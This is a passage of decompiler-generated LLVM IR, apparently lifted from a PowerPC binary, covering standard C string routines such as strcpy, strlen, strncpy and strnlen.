  %v0_1000d2b0 = phi i32 [ %v1_1000d288, %entry ], [ %v0_1000d2b0.pre, %dec_label_pc_1000d2a4 ]
  %v1_1000d2b0 = mul i32 %v0_1000d2b0, 256
  %v2_1000d2b8 = or i32 %v1_1000d2b0, %v0_1000d2b0
  %v1_1000d2c0 = mul i32 %v2_1000d2b8, 65536
  %v2_1000d2c4 = or i32 %v1_1000d2c0, %v2_1000d2b8
  br label %dec_label_pc_1000d2c8

dec_label_pc_1000d2c8:                            ; preds = %dec_label_pc_1000d2c8, %dec_label_pc_1000d37c, %dec_label_pc_1000d2b0
  %v0_1000d320 = phi i32 [ %v0_1000d2c810, %dec_label_pc_1000d2b0 ], [ %v1_1000d2cc, %dec_label_pc_1000d37c ], [ %v1_1000d2cc, %dec_label_pc_1000d2c8 ]
  %v1_1000d2c8 = inttoptr i32 %v0_1000d320 to i32*
  %v2_1000d2c8 = load i32, i32* %v1_1000d2c8, align 4
  %v1_1000d2cc = add i32 %v0_1000d320, 4
  %v2_1000d2d4 = xor i32 %v2_1000d2c8, %v2_1000d2c4
  %v1_1000d2d8 = add i32 %v2_1000d2c8, 2130640639
  %v2_1000d2e0 = xor i32 %v1_1000d2d8, %v2_1000d2c8
  %v1_1000d2e4 = add i32 %v2_1000d2d4, 2130640639
  %v2_1000d2e8 = and i32 %v2_1000d2e0, -2130640640
  %v3_1000d2e8 = xor i32 %v2_1000d2e8, -2130640640
  %v2_1000d2ec = xor i32 %v1_1000d2e4, %v2_1000d2d4
  %v2_1000d2f0 = and i32 %v2_1000d2ec, -2130640640
  %v3_1000d2f0 = xor i32 %v2_1000d2f0, -2130640640
  %v1_1000d2fc = add i32 %v0_1000d320, 1
  %tmp = or i32 %v3_1000d2f0, %v3_1000d2e8
  %brmerge = icmp eq i32 %tmp, 0
  br i1 %brmerge, label %dec_label_pc_1000d2c8, label %dec_label_pc_1000d308

dec_label_pc_1000d308:                            ; preds = %dec_label_pc_1000d2c8
  %v2_1000d308 = inttoptr i32 %v0_1000d320 to i8*
  %v3_1000d308 = load i8, i8* %v2_1000d308, align 1
  %v4_1000d308 = zext i8 %v3_1000d308 to i32
  %v1_1000d30c = add i32 %v0_1000d320, 2
  %v1_1000d310 = add i32 %v0_1000d320, 3
  %v4_1000d314 = icmp eq i32 %v4_1000d308, %v0_1000d2b0
  br i1 %v4_1000d314, label %dec_label_pc_1000d320, label %dec_label_pc_1000d328

dec_label_pc_1000d320:                            ; preds = %dec_label_pc_1000d308
  ret i32 %v0_1000d320

dec_label_pc_1000d328:                            ; preds = %dec_label_pc_1000d308
  %v3_1000d318 = icmp eq i8 %v3_1000d308, 0
  br i1 %v3_1000d318, label %dec_label_pc_1000d380, label %dec_label_pc_1000d32c

dec_label_pc_1000d32c:                            ; preds = %dec_label_pc_1000d328
  %v2_1000d32c = inttoptr i32 %v1_1000d2fc to i8*
  %v3_1000d32c = load i8, i8* %v2_1000d32c, align 1
  %v4_1000d32c = zext i8 %v3_1000d32c to i32
  %v4_1000d330 = icmp eq i32 %v4_1000d32c, %v0_1000d2b0
  br i1 %v4_1000d330, label %dec_label_pc_1000d33c, label %dec_label_pc_1000d344

dec_label_pc_1000d33c:                            ; preds = %dec_label_pc_1000d32c
  ret i32 %v1_1000d2fc

dec_label_pc_1000d344:                            ; preds = %dec_label_pc_1000d32c
  %v3_1000d334 = icmp eq i8 %v3_1000d32c, 0
  br i1 %v3_1000d334, label %dec_label_pc_1000d380, label %dec_label_pc_1000d348

dec_label_pc_1000d348:                            ; preds = %dec_label_pc_1000d344
  %v2_1000d348 = inttoptr i32 %v1_1000d30c to i8*
  %v3_1000d348 = load i8, i8* %v2_1000d348, align 1
  %v4_1000d348 = zext i8 %v3_1000d348 to i32
  %v4_1000d34c = icmp eq i32 %v4_1000d348, %v0_1000d2b0
  br i1 %v4_1000d34c, label %dec_label_pc_1000d358, label %dec_label_pc_1000d360

dec_label_pc_1000d358:                            ; preds = %dec_label_pc_1000d348
  ret i32 %v1_1000d30c

dec_label_pc_1000d360:                            ; preds = %dec_label_pc_1000d348
  %v3_1000d350 = icmp eq i8 %v3_1000d348, 0
  br i1 %v3_1000d350, label %dec_label_pc_1000d380, label %dec_label_pc_1000d364

dec_label_pc_1000d364:                            ; preds = %dec_label_pc_1000d360
  %v2_1000d364 = inttoptr i32 %v1_1000d310 to i8*
  %v3_1000d364 = load i8, i8* %v2_1000d364, align 1
  %v4_1000d364 = zext i8 %v3_1000d364 to i32
  %v4_1000d368 = icmp eq i32 %v4_1000d364, %v0_1000d2b0
  br i1 %v4_1000d368, label %dec_label_pc_1000d374, label %dec_label_pc_1000d37c

dec_label_pc_1000d374:                            ; preds = %dec_label_pc_1000d364
  ret i32 %v1_1000d310

dec_label_pc_1000d37c:                            ; preds = %dec_label_pc_1000d364
  %v3_1000d36c = icmp eq i8 %v3_1000d364, 0
  br i1 %v3_1000d36c, label %dec_label_pc_1000d380, label %dec_label_pc_1000d2c8

dec_label_pc_1000d380:                            ; preds = %dec_label_pc_1000d290, %dec_label_pc_1000d37c, %dec_label_pc_1000d360, %dec_label_pc_1000d344, %dec_label_pc_1000d328
  ret i32 0

; uselistorder directives
  uselistorder i32 %v1_1000d2cc, { 1, 0 }
  uselistorder i32 %v2_1000d2c8, { 0, 2, 1 }
  uselistorder i32 %v0_1000d320, { 0, 1, 2, 4, 3, 6, 5 }
  uselistorder i32 %v2_1000d2b8, { 1, 0 }
  uselistorder i32 %v0_1000d2b0, { 5, 4, 3, 2, 1, 0 }
  uselistorder i32 %v1_1000d2a4, { 1, 0, 3, 2 }
  uselistorder i32 %v0_1000d2a82, { 2, 1, 0 }
  uselistorder i32 %v1_1000d288, { 1, 2, 0 }
  uselistorder label %dec_label_pc_1000d380, { 1, 2, 3, 4, 0 }
  uselistorder label %dec_label_pc_1000d2c8, { 1, 0, 2 }
  uselistorder label %dec_label_pc_1000d290, { 1, 0 }
}

define i32 @__GI_strcoll(i8* %arg1, i32 %arg2) local_unnamed_addr {
entry:
  %tmp = ptrtoint i8* %arg1 to i32
  %v0_1000d394.pre = load i32, i32* @r4, align 4
  br label %dec_label_pc_1000d38c

dec_label_pc_1000d38c:                            ; preds = %dec_label_pc_1000d3b0, %entry
  %v0_1000d394 = phi i32 [ %v1_1000d398, %dec_label_pc_1000d3b0 ], [ %v0_1000d394.pre, %entry ]
  %v0_1000d38c = phi i32 [ %v1_1000d390, %dec_label_pc_1000d3b0 ], [ %tmp, %entry ]
  %v1_1000d38c = inttoptr i32 %v0_1000d38c to i8*
  %v2_1000d38c = load i8, i8* %v1_1000d38c, align 1
  %v3_1000d38c = zext i8 %v2_1000d38c to i32
  %v1_1000d394 = inttoptr i32 %v0_1000d394 to i8*
  %v2_1000d394 = load i8, i8* %v1_1000d394, align 1
  %v3_1000d394 = zext i8 %v2_1000d394 to i32
  %v3_1000d39c = icmp eq i8 %v2_1000d38c, 0
  br i1 %v3_1000d39c, label %dec_label_pc_1000d3a8, label %dec_label_pc_1000d3b0

dec_label_pc_1000d3a8:                            ; preds = %dec_label_pc_1000d38c
  %v1_1000d3a8 = sub nsw i32 0, %v3_1000d394
  ret i32 %v1_1000d3a8

dec_label_pc_1000d3b0:                            ; preds = %dec_label_pc_1000d38c
  %v4_1000d3a0 = icmp eq i8 %v2_1000d38c, %v2_1000d394
  %v1_1000d398 = add i32 %v0_1000d394, 1
  %v1_1000d390 = add i32 %v0_1000d38c, 1
  br i1 %v4_1000d3a0, label %dec_label_pc_1000d38c, label %dec_label_pc_1000d3b4

dec_label_pc_1000d3b4:                            ; preds = %dec_label_pc_1000d3b0
  %v2_1000d3b4 = sub nsw i32 %v3_1000d38c, %v3_1000d394
  ret i32 %v2_1000d3b4

; uselistorder directives
  uselistorder i32 %v3_1000d394, { 1, 0 }
  uselistorder i32 %v0_1000d38c, { 1, 0 }
  uselistorder i32 %v0_1000d394, { 1, 0 }
}

define i32 @strcpy(i32 %arg1, i8* %arg2) local_unnamed_addr {
entry:
  %cr7_eq.global-to-local = alloca i1, align 1
  %r4.global-to-local = alloca i32, align 4
  %r9.global-to-local = alloca i32, align 4
  %tmp = ptrtoint i8* %arg2 to i32
  store i32 %tmp, i32* %r4.global-to-local, align 4
  %v2_1000d3bc = add i32 %arg1, -1
  %v1_1000d3c0 = sub i32 %v2_1000d3bc, %tmp
  store i32 %v1_1000d3c0, i32* %r9.global-to-local, align 4
  %v2_1000d3c44 = load i8, i8* %arg2, align 1
  %v1_1000d3c86 = add i32 %tmp, 1
  store i32 %v1_1000d3c86, i32* %r4.global-to-local, align 4
  %v3_1000d3cc8 = icmp eq i8 %v2_1000d3c44, 0
  store i1 %v3_1000d3cc8, i1* %cr7_eq.global-to-local, align 1
  %v5_1000d3d09 = inttoptr i32 %arg1 to i8*
  store i8 %v2_1000d3c44, i8* %v5_1000d3d09, align 1
  %v0_1000d3d410 = load i1, i1* %cr7_eq.global-to-local, align 1
  br i1 %v0_1000d3d410, label %dec_label_pc_1000d3d8, label %dec_label_pc_1000d3c4.dec_label_pc_1000d3c4_crit_edge

dec_label_pc_1000d3c4.dec_label_pc_1000d3c4_crit_edge: ; preds = %entry, %dec_label_pc_1000d3c4.dec_label_pc_1000d3c4_crit_edge
  %v0_1000d3c4.pre = load i32, i32* %r4.global-to-local, align 4
  %v2_1000d3d0.pre = load i32, i32* %r9.global-to-local, align 4
  %v1_1000d3c4 = inttoptr i32 %v0_1000d3c4.pre to i8*
  %v2_1000d3c4 = load i8, i8* %v1_1000d3c4, align 1
  %v1_1000d3c8 = add i32 %v0_1000d3c4.pre, 1
  store i32 %v1_1000d3c8, i32* %r4.global-to-local, align 4
  %v3_1000d3cc = icmp eq i8 %v2_1000d3c4, 0
  store i1 %v3_1000d3cc, i1* %cr7_eq.global-to-local, align 1
  %v4_1000d3d0 = add i32 %v1_1000d3c8, %v2_1000d3d0.pre
  %v5_1000d3d0 = inttoptr i32 %v4_1000d3d0 to i8*
  store i8 %v2_1000d3c4, i8* %v5_1000d3d0, align 1
  %v0_1000d3d4 = load i1, i1* %cr7_eq.global-to-local, align 1
  br i1 %v0_1000d3d4, label %dec_label_pc_1000d3d8, label %dec_label_pc_1000d3c4.dec_label_pc_1000d3c4_crit_edge

dec_label_pc_1000d3d8:                            ; preds = %dec_label_pc_1000d3c4.dec_label_pc_1000d3c4_crit_edge, %entry
  ret i32 %arg1

; uselistorder directives
  uselistorder i32 %tmp, { 1, 0, 2 }
  uselistorder i32* %r4.global-to-local, { 3, 2, 1, 0 }
  uselistorder i1* %cr7_eq.global-to-local, { 2, 3, 0, 1 }
  uselistorder i32 %arg1, { 2, 0, 1 }
  uselistorder label %dec_label_pc_1000d3c4.dec_label_pc_1000d3c4_crit_edge, { 1, 0 }
}

define i32 @__GI_strlen() local_unnamed_addr {
entry:
  %v0_1000d3dc = load i32, i32* @r3, align 4
  %v1_1000d3f43 = urem i32 %v0_1000d3dc, 4
  %v3_1000d3f45 = icmp eq i32 %v1_1000d3f43, 0
  br i1 %v3_1000d3f45, label %dec_label_pc_1000d3fc, label %dec_label_pc_1000d3e4

dec_label_pc_1000d3e4:                            ; preds = %entry, %dec_label_pc_1000d3f0
  %v0_1000d3f0 = phi i32 [ %v1_1000d3f0, %dec_label_pc_1000d3f0 ], [ %v0_1000d3dc, %entry ]
  %v1_1000d3e4 = inttoptr i32 %v0_1000d3f0 to i8*
  %v2_1000d3e4 = load i8, i8* %v1_1000d3e4, align 1
  %v3_1000d3e8 = icmp eq i8 %v2_1000d3e4, 0
  br i1 %v3_1000d3e8, label %dec_label_pc_1000d430, label %dec_label_pc_1000d3f0

dec_label_pc_1000d3f0:                            ; preds = %dec_label_pc_1000d3e4
  %v1_1000d3f0 = add i32 %v0_1000d3f0, 1
  %v1_1000d3f4 = urem i32 %v1_1000d3f0, 4
  %v3_1000d3f4 = icmp eq i32 %v1_1000d3f4, 0
  br i1 %v3_1000d3f4, label %dec_label_pc_1000d3fc, label %dec_label_pc_1000d3e4

dec_label_pc_1000d3fc:                            ; preds = %dec_label_pc_1000d3f0, %entry
  %v0_1000d400 = phi i32 [ %v0_1000d3dc, %entry ], [ %v1_1000d3f0, %dec_label_pc_1000d3f0 ]
  store i32 -2139062144, i32* @r8, align 4
  br label %dec_label_pc_1000d408

dec_label_pc_1000d408:                            ; preds = %dec_label_pc_1000d468, %dec_label_pc_1000d408, %dec_label_pc_1000d3fc
  %v1_1000d444 = phi i32 [ %v0_1000d400, %dec_label_pc_1000d3fc ], [ %v1_1000d40c, %dec_label_pc_1000d408 ], [ %v1_1000d40c, %dec_label_pc_1000d468 ]
  %v1_1000d408 = inttoptr i32 %v1_1000d444 to i32*
  %v2_1000d408 = load i32, i32* %v1_1000d408, align 4
  %v1_1000d40c = add i32 %v1_1000d444, 4
  %v1_1000d418 = add i32 %v2_1000d408, -16843009
  %v2_1000d41c = and i32 %v1_1000d418, -2139062144
  %v5_1000d41c = icmp eq i32 %v2_1000d41c, 0
  br i1 %v5_1000d41c, label %dec_label_pc_1000d408, label %dec_label_pc_1000d424

dec_label_pc_1000d424:                            ; preds = %dec_label_pc_1000d408
  %v2_1000d424 = inttoptr i32 %v1_1000d444 to i8*
  %v3_1000d424 = load i8, i8* %v2_1000d424, align 1
  %v3_1000d428 = icmp eq i8 %v3_1000d424, 0
  br i1 %v3_1000d428, label %dec_label_pc_1000d430, label %dec_label_pc_1000d438

dec_label_pc_1000d430:                            ; preds = %dec_label_pc_1000d3e4, %dec_label_pc_1000d424
  %v1_1000d430 = phi i32 [ %v1_1000d444, %dec_label_pc_1000d424 ], [ %v0_1000d3f0, %dec_label_pc_1000d3e4 ]
  %v2_1000d430 = sub i32 %v1_1000d430, %v0_1000d3dc
  ret i32 %v2_1000d430

dec_label_pc_1000d438:                            ; preds = %dec_label_pc_1000d424
  %v1_1000d438 = add i32 %v1_1000d444, 1
  %v2_1000d438 = inttoptr i32 %v1_1000d438 to i8*
  %v3_1000d438 = load i8, i8* %v2_1000d438, align 1
  %v3_1000d43c = icmp eq i8 %v3_1000d438, 0
  br i1 %v3_1000d43c, label %dec_label_pc_1000d444, label %dec_label_pc_1000d450

dec_label_pc_1000d444:                            ; preds = %dec_label_pc_1000d438
  %v2_1000d444 = sub i32 %v1_1000d444, %v0_1000d3dc
  %v1_1000d448 = add i32 %v2_1000d444, 1
  ret i32 %v1_1000d448

dec_label_pc_1000d450:                            ; preds = %dec_label_pc_1000d438
  %v1_1000d450 = add i32 %v1_1000d444, 2
  %v2_1000d450 = inttoptr i32 %v1_1000d450 to i8*
  %v3_1000d450 = load i8, i8* %v2_1000d450, align 1
  %v3_1000d454 = icmp eq i8 %v3_1000d450, 0
  br i1 %v3_1000d454, label %dec_label_pc_1000d45c, label %dec_label_pc_1000d468

dec_label_pc_1000d45c:                            ; preds = %dec_label_pc_1000d450
  %v2_1000d45c = sub i32 %v1_1000d444, %v0_1000d3dc
  %v1_1000d460 = add i32 %v2_1000d45c, 2
  ret i32 %v1_1000d460

dec_label_pc_1000d468:                            ; preds = %dec_label_pc_1000d450
  %v1_1000d468 = add i32 %v1_1000d444, 3
  %v2_1000d468 = inttoptr i32 %v1_1000d468 to i8*
  %v3_1000d468 = load i8, i8* %v2_1000d468, align 1
  %v3_1000d46c = icmp eq i8 %v3_1000d468, 0
  br i1 %v3_1000d46c, label %dec_label_pc_1000d474, label %dec_label_pc_1000d408

dec_label_pc_1000d474:                            ; preds = %dec_label_pc_1000d468
  %v2_1000d474 = sub i32 %v1_1000d444, %v0_1000d3dc
  %v1_1000d478 = add i32 %v2_1000d474, 3
  ret i32 %v1_1000d478

; uselistorder directives
  uselistorder i32 %v1_1000d40c, { 1, 0 }
  uselistorder i32 %v1_1000d444, { 3, 4, 2, 5, 1, 6, 0, 7, 9, 8 }
  uselistorder i32 %v1_1000d3f0, { 1, 0, 2 }
  uselistorder i32 %v0_1000d3dc, { 6, 5, 4, 3, 2, 1, 0 }
  uselistorder label %dec_label_pc_1000d430, { 1, 0 }
  uselistorder label %dec_label_pc_1000d3e4, { 1, 0 }
}

define i32 @strncpy(i32 %arg1, i32 %arg2, i32 %arg3) local_unnamed_addr {
entry:
  %cr7_eq.global-to-local = alloca i1, align 1
  %ctr.global-to-local = alloca i32, align 4
  %r10.global-to-local = alloca i32, align 4
  %r11.global-to-local = alloca i32, align 4
  %r9.global-to-local = alloca i32, align 4
  %v3_1000d480 = icmp eq i32 %arg2, 3
  store i1 %v3_1000d480, i1* %cr7_eq.global-to-local, align 1
  %v1_1000d484 = add i32 %arg1, -1
  store i32 %v1_1000d484, i32* %r11.global-to-local, align 4
  %tmp = icmp ult i32 %arg2, 4
  br i1 %tmp, label %dec_label_pc_1000d500, label %dec_label_pc_1000d48c

dec_label_pc_1000d48c:                            ; preds = %entry
  %v1_1000d48c = udiv i32 %arg2, 4
  store i32 %v1_1000d48c, i32* %ctr.global-to-local, align 4
  br label %dec_label_pc_1000d494

dec_label_pc_1000d494:                            ; preds = %dec_label_pc_1000d4e4, %dec_label_pc_1000d48c
  %v2_1000d4a4 = phi i32 [ %v3_1000d4dc, %dec_label_pc_1000d4e4 ], [ %v1_1000d484, %dec_label_pc_1000d48c ]
  %v0_1000d494 = load i32, i32* @r4, align 4
  %v1_1000d494 = inttoptr i32 %v0_1000d494 to i8*
  %v2_1000d494 = load i8, i8* %v1_1000d494, align 1
  %v1_1000d498 = add i32 %v0_1000d494, 1
  store i32 %v1_1000d498, i32* %r10.global-to-local, align 4
  %v1_1000d49c = add i32 %v0_1000d494, 2
  store i32 %v1_1000d49c, i32* @r8, align 4
  %v3_1000d4a0 = icmp eq i8 %v2_1000d494, 0
  store i1 %v3_1000d4a0, i1* %cr7_eq.global-to-local, align 1
  %v3_1000d4a4 = add i32 %v2_1000d4a4, 1
  %v4_1000d4a4 = inttoptr i32 %v3_1000d4a4 to i8*
  store i8 %v2_1000d494, i8* %v4_1000d4a4, align 1
  store i32 %v3_1000d4a4, i32* %r11.global-to-local, align 4
  %v0_1000d4a8 = load i32, i32* @r8, align 4
  %v1_1000d4a8 = add i32 %v0_1000d4a8, 1
  store i32 %v1_1000d4a8, i32* %r9.global-to-local, align 4
  %v0_1000d4ac = load i1, i1* %cr7_eq.global-to-local, align 1
  br i1 %v0_1000d4ac, label %dec_label_pc_1000d4ec, label %dec_label_pc_1000d4b0

dec_label_pc_1000d4b0:                            ; preds = %dec_label_pc_1000d494
  %v0_1000d4b0 = load i32, i32* @r4, align 4
  %v1_1000d4b0 = add i32 %v0_1000d4b0, 1
  %v2_1000d4b0 = inttoptr i32 %v1_1000d4b0 to i8*
  %v3_1000d4b0 = load i8, i8* %v2_1000d4b0, align 1
  %v1_1000d4b4 = add i32 %v0_1000d4a8, 2
  store i32 %v1_1000d4b4, i32* @r4, align 4
  %v3_1000d4b8 = icmp eq i8 %v3_1000d4b0, 0
  store i1 %v3_1000d4b8, i1* %cr7_eq.global-to-local, align 1
  %v3_1000d4bc = add i32 %v2_1000d4a4, 2
  %v4_1000d4bc = inttoptr i32 %v3_1000d4bc to i8*
  store i8 %v3_1000d4b0, i8* %v4_1000d4bc, align 1
  store i32 %v3_1000d4bc, i32* %r11.global-to-local, align 4
  %v0_1000d4c0 = load i1, i1* %cr7_eq.global-to-local, align 1
  br i1 %v0_1000d4c0, label %dec_label_pc_1000d4ec, label %dec_label_pc_1000d4c4

dec_label_pc_1000d4c4:                            ; preds = %dec_label_pc_1000d4b0
  %v0_1000d4c4 = load i32, i32* %r10.global-to-local, align 4
  %v1_1000d4c4 = add i32 %v0_1000d4c4, 1
  %v2_1000d4c4 = inttoptr i32 %v1_1000d4c4 to i8*
  %v3_1000d4c4 = load i8, i8* %v2_1000d4c4, align 1
  %v3_1000d4c8 = icmp eq i8 %v3_1000d4c4, 0
  store i1 %v3_1000d4c8, i1* %cr7_eq.global-to-local, align 1
  %v3_1000d4cc = add i32 %v2_1000d4a4, 3
  %v4_1000d4cc = inttoptr i32 %v3_1000d4cc to i8*
  store i8 %v3_1000d4c4, i8* %v4_1000d4cc, align 1
  store i32 %v3_1000d4cc, i32* %r11.global-to-local, align 4
  %v0_1000d4d0 = load i1, i1* %cr7_eq.global-to-local, align 1
  br i1 %v0_1000d4d0, label %dec_label_pc_1000d4ec, label %dec_label_pc_1000d4d4

dec_label_pc_1000d4d4:                            ; preds = %dec_label_pc_1000d4c4
  %v0_1000d4d4 = load i32, i32* @r8, align 4
  %v1_1000d4d4 = add i32 %v0_1000d4d4, 1
  %v2_1000d4d4 = inttoptr i32 %v1_1000d4d4 to i8*
  %v3_1000d4d4 = load i8, i8* %v2_1000d4d4, align 1
  %v3_1000d4d8 = icmp eq i8 %v3_1000d4d4, 0
  store i1 %v3_1000d4d8, i1* %cr7_eq.global-to-local, align 1
  %v3_1000d4dc = add i32 %v2_1000d4a4, 4
  %v4_1000d4dc = inttoptr i32 %v3_1000d4dc to i8*
  store i8 %v3_1000d4d4, i8* %v4_1000d4dc, align 1
  store i32 %v3_1000d4dc, i32* %r11.global-to-local, align 4
  %v0_1000d4e0 = load i1, i1* %cr7_eq.global-to-local, align 1
  br i1 %v0_1000d4e0, label %dec_label_pc_1000d4ec, label %dec_label_pc_1000d4e4

dec_label_pc_1000d4e4:                            ; preds = %dec_label_pc_1000d4d4
  %v0_1000d4e4 = load i32, i32* %ctr.global-to-local, align 4
  %v1_1000d4e4 = add i32 %v0_1000d4e4, -1
  store i32 %v1_1000d4e4, i32* %ctr.global-to-local, align 4
  %v2_1000d4e4 = icmp eq i32 %v1_1000d4e4, 0
  br i1 %v2_1000d4e4, label %dec_label_pc_1000d500, label %dec_label_pc_1000d494

dec_label_pc_1000d4ec:                            ; preds = %dec_label_pc_1000d4d4, %dec_label_pc_1000d4c4, %dec_label_pc_1000d4b0, %dec_label_pc_1000d494
  %v1_1000d4ec = phi i32 [ %v3_1000d4dc, %dec_label_pc_1000d4d4 ], [ %v3_1000d4cc, %dec_label_pc_1000d4c4 ], [ %v3_1000d4bc, %dec_label_pc_1000d4b0 ], [ %v3_1000d4a4, %dec_label_pc_1000d494 ]
  %v2_1000d4ec11 = sub i32 %arg1, %v1_1000d4ec
  %v2_1000d4f0 = add i32 %v2_1000d4ec11, %arg2
  %v1_1000d4f4 = add i32 %v2_1000d4f0, -1
  store i32 %v1_1000d4f4, i32* %r9.global-to-local, align 4
  %v4_1000d4f4 = icmp eq i32 %v1_1000d4f4, 0
  %v0_1000d4f8 = load i32, i32* @lr, align 4
  call void @__pseudo_cond_branch(i1 %v4_1000d4f4, i32 %v0_1000d4f8)
  %v2_1000d530.pre.pre = load i32, i32* %r11.global-to-local, align 4
  br label %dec_label_pc_1000d528

dec_label_pc_1000d500:                            ; preds = %dec_label_pc_1000d4e4, %entry
  %v1_1000d500 = urem i32 %arg2, 4
  store i32 %v1_1000d500, i32* %r9.global-to-local, align 4
  %v3_1000d500 = icmp eq i32 %v1_1000d500, 0
  %v0_1000d504 = load i32, i32* @lr, align 4
  call void @__pseudo_cond_branch(i1 %v3_1000d500, i32 %v0_1000d504)
  store i32 %v1_1000d500, i32* %ctr.global-to-local, align 4
  %v2_1000d51c.pre = load i32, i32* %r11.global-to-local, align 4
  br label %dec_label_pc_1000d50c

dec_label_pc_1000d50c:                            ; preds = %dec_label_pc_1000d524.dec_label_pc_1000d50c_crit_edge, %dec_label_pc_1000d500
  %v2_1000d51c = phi i32 [ %v3_1000d51c, %dec_label_pc_1000d524.dec_label_pc_1000d50c_crit_edge ], [ %v2_1000d51c.pre, %dec_label_pc_1000d500 ]
  %v0_1000d510 = phi i32 [ %v0_1000d510.pre, %dec_label_pc_1000d524.dec_label_pc_1000d50c_crit_edge ], [ %v1_1000d500, %dec_label_pc_1000d500 ]
  %v0_1000d50c = load i32, i32* @r4, align 4
  %v1_1000d50c = inttoptr i32 %v0_1000d50c to i8*
  %v2_1000d50c = load i8, i8* %v1_1000d50c, align 1
  %v1_1000d510 = add i32 %v0_1000d510, -1
  store i32 %v1_1000d510, i32* %r9.global-to-local, align 4
  %v1_1000d514 = add i32 %v0_1000d50c, 1
  store i32 %v1_1000d514, i32* @r4, align 4
  %v3_1000d518 = icmp eq i8 %v2_1000d50c, 0
  store i1 %v3_1000d518, i1* %cr7_eq.global-to-local, align 1
  %v3_1000d51c = add i32 %v2_1000d51c, 1
  %v4_1000d51c = inttoptr i32 %v3_1000d51c to i8*
  store i8 %v2_1000d50c, i8* %v4_1000d51c, align 1
  store i32 %v3_1000d51c, i32* %r11.global-to-local, align 4
  %v0_1000d520 = load i32, i32* %ctr.global-to-local, align 4
  %v1_1000d520 = add i32 %v0_1000d520, -1
  store i32 %v1_1000d520, i32* %ctr.global-to-local, align 4
  %v2_1000d520 = icmp eq i32 %v1_1000d520, 0
  br i1 %v2_1000d520, label %dec_label_pc_1000d538, label %dec_label_pc_1000d524

dec_label_pc_1000d524:                            ; preds = %dec_label_pc_1000d50c
  %v0_1000d524 = load i1, i1* %cr7_eq.global-to-local, align 1
  br i1 %v0_1000d524, label %dec_label_pc_1000d528, label %dec_label_pc_1000d524.dec_label_pc_1000d50c_crit_edge

dec_label_pc_1000d524.dec_label_pc_1000d50c_crit_edge: ; preds = %dec_label_pc_1000d524
  %v0_1000d510.pre = load i32, i32* %r9.global-to-local, align 4
  br label %dec_label_pc_1000d50c

dec_label_pc_1000d528:                            ; preds = %dec_label_pc_1000d524, %dec_label_pc_1000d4ec
  %v2_1000d530.pre = phi i32 [ %v2_1000d530.pre.pre, %dec_label_pc_1000d4ec ], [ %v3_1000d51c, %dec_label_pc_1000d524 ]
  %v0_1000d528 = load i32, i32* %r9.global-to-local, align 4
  store i32 %v0_1000d528, i32* %ctr.global-to-local, align 4
  br label %dec_label_pc_1000d52c

dec_label_pc_1000d52c:                            ; preds = %dec_label_pc_1000d52c, %dec_label_pc_1000d528
  %v2_1000d530 = phi i32 [ %v3_1000d530, %dec_label_pc_1000d52c ], [ %v2_1000d530.pre, %dec_label_pc_1000d528 ]
  %v3_1000d530 = add i32 %v2_1000d530, 1
  %v4_1000d530 = inttoptr i32 %v3_1000d530 to i8*
  store i8 0, i8* %v4_1000d530, align 1
  store i32 %v3_1000d530, i32* %r11.global-to-local, align 4
  %v0_1000d534 = load i32, i32* %ctr.global-to-local, align 4
  %v1_1000d534 = add i32 %v0_1000d534, -1
  store i32 %v1_1000d534, i32* %ctr.global-to-local, align 4
  %v2_1000d534 = icmp eq i32 %v1_1000d534, 0
  br i1 %v2_1000d534, label %dec_label_pc_1000d538, label %dec_label_pc_1000d52c

dec_label_pc_1000d538:                            ; preds = %dec_label_pc_1000d50c, %dec_label_pc_1000d52c
  ret i32 %arg1

; uselistorder directives
  uselistorder i32 %v1_1000d534, { 1, 0 }
  uselistorder i32 %v3_1000d530, { 1, 2, 0 }
  uselistorder i32 %v1_1000d520, { 1, 0 }
  uselistorder i32 %v3_1000d51c, { 0, 2, 3, 1 }
  uselistorder i32 %v1_1000d500, { 1, 0, 3, 2 }
  uselistorder i32 %v1_1000d4e4, { 1, 0 }
  uselistorder i32 %v3_1000d4dc, { 0, 2, 3, 1 }
  uselistorder i32* %r9.global-to-local, { 3, 0, 1, 2, 4, 5 }
  uselistorder i32* %r11.global-to-local, { 0, 1, 7, 5, 2, 3, 4, 6, 8 }
  uselistorder i32 %arg2, { 1, 0, 2, 3, 4 }
  uselistorder i32 %arg1, { 2, 0, 1 }
  uselistorder label %dec_label_pc_1000d538, { 1, 0 }
}

define i32 @strnlen(i8* %arg1) local_unnamed_addr {
entry:
  %tmp = ptrtoint i8* %arg1 to i32
  %v0_1000d53c = load i32, i32* @r4, align 4
  %v3_1000d53c = icmp eq i32 %v0_1000d53c, 0
  %v0_1000d548 = load i32, i32* @lr, align 4
  call void @__pseudo_cond_branch(i1 %v3_1000d53c, i32 %v0_1000d548)
  %v1_1000d558 = load i32, i32* @r4, align 4
  %v2_1000d558 = add i32 %v1_1000d558, %tmp
  %v3_1000d55c = icmp ugt i32 %v2_1000d558, %tmp
  %v4_1000d55c = icmp eq i32 %v1_1000d558, 0
  %v2_1000d560 = or i1 %v4_1000d55c, %v3_1000d55c
  br i1 %v2_1000d560, label %dec_label_pc_1000d568, label %dec_label_pc_1000d564

dec_label_pc_1000d550:                            ; preds = %dec_label_pc_1000d5d0
  br label %dec_label_pc_1000d614

dec_label_pc_1000d564:                            ; preds = %entry
  br label %dec_label_pc_1000d568

dec_label_pc_1000d568:                            ; preds = %entry, %dec_label_pc_1000d564
  %v0_1000d618 = phi i32 [ %v2_1000d558, %entry ], [ -1, %dec_label_pc_1000d564 ]
  %v1_1000d5986 = urem i32 %tmp, 4
  %v3_1000d5988 = icmp eq i32 %v1_1000d5986, 0
  br i1 %v3_1000d5988, label %dec_label_pc_1000d5a0, label %dec_label_pc_1000d570

dec_label_pc_1000d570:                            ; preds = %dec_label_pc_1000d568, %dec_label_pc_1000d594
  %v0_1000d588 = phi i32 [ %v1_1000d594, %dec_label_pc_1000d594 ], [ %tmp, %dec_label_pc_1000d568 ]
  %v1_1000d570 = inttoptr i32 %v0_1000d588 to i8*
  %v2_1000d570 = load i8, i8* %v1_1000d570, align 1
  %v3_1000d574 = icmp eq i8 %v2_1000d570, 0
  br i1 %v3_1000d574, label %dec_label_pc_1000d57c, label %dec_label_pc_1000d594

dec_label_pc_1000d57c:                            ; preds = %dec_label_pc_1000d570
  %v3_1000d57c = icmp ugt i32 %v0_1000d618, %v0_1000d588
  %v0_1000d588.v0_1000d618 = select i1 %v3_1000d57c, i32 %v0_1000d588, i32 %v0_1000d618
  %v2_1000d58c = sub i32 %v0_1000d588.v0_1000d618, %tmp
  ret i32 %v2_1000d58c

